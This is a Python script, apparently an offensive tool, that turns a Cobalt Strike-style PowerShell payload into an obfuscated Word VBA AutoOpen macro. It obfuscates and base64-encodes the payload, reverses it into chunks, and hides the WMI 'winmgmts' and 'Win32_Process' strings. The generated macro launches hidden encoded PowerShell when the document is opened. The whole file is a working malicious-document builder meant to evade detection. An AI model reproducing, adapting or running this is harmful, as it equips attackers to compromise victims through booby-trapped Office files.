import random
import string
import os, subprocess
from optparse import OptionParser

parser = OptionParser(usage="usage:  %prog [options]")
parser.add_option("-f", action="store", dest="payload_file",
                      help="CS Payload - filename")
(options, args) = parser.parse_args()

if len(args) != 0:
        parser.error("You need to select the file to obfuscate")


def reverse(s):
        return "".join(reversed(s))

def randomString(stringLength):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(stringLength))

payload_file = options.payload_file


#Invoke Obfuscation commands to run
obf_command = '\\"Token,all,1\\"'


obf_command = subprocess.call("pwsh -C 'Invoke-Obfuscation -ScriptPath %s -Command %s -Quiet | Out-File inter_file'" %(payload_file, obf_command), shell = True)
payload = subprocess.check_output("cat inter_file | iconv -t utf-16le | base64 | tr -d '\\n'", shell = True)
clearance = subprocess.call("rm inter_file", shell = True)


launcher = "powershell.exe -w 1 -nop -enc"
wObjName = randomString(6)
wModName = randomString(6)


doc_load = "Sub AutoOpen()"
process_create = wObjName + '= strReverse(":stmgmniw")'
process_open = wModName + '= StrReverse("ssecorP_23niw")'

execute = "GetObject(" + wObjName + ").Get(" + wModName + ").Create "
doc_close = "End Sub"


rev_payload = reverse(payload)
n = 100
out = [(rev_payload[i:i+n]) for i in range(0, len(rev_payload), n)]

print doc_load + "\n"

payload_list=[]
tempList=[]

for i in range (0,len(out)):
	if (i!=0):
		if ((i%24)==0):
			payload_list.append(tempList)
			tempList=[]
			output='"' + out[i].strip() + '" & _'
			tempList.append(output)
		else:
			output='"' + out[i].strip() + '" & _'
			tempList.append(output)
	else:
		output='"' + out[i].strip() + '" & _'
		tempList.append(output)
payload_list.append(tempList)

load=[]
for i in range (0,len(payload_list)):
	loadVar=randomString(6)
	load.append(loadVar)
	print loadVar + ' = ' + payload_list[i][0]
	if i == len(payload_list)-1:
		for k in range (1,len(payload_list[i])):
			if k == len(payload_list[i])-1:
				last_seq=payload_list[i][k]
				print last_seq[:-5] + " " +  reverse(launcher)+  '"'
			else:	
				print payload_list[i][k]
	else:
		for k in range(1,23):
			print payload_list[i][k]
		print payload_list[i][23][:-4]
	print "\n"	

for i in range(len(load)-1, -1, -1):
	if i!=0:
		executeVar="strReverse(" + load[i] + ")"  " + "
		execute=execute+executeVar
	else:
		executeVar="strReverse(" + load[i] + ")" 
		execute=execute+executeVar
		execute=execute+", null, null, pid"

print "\n" + process_create
print process_open
print execute
print "\n" + doc_close
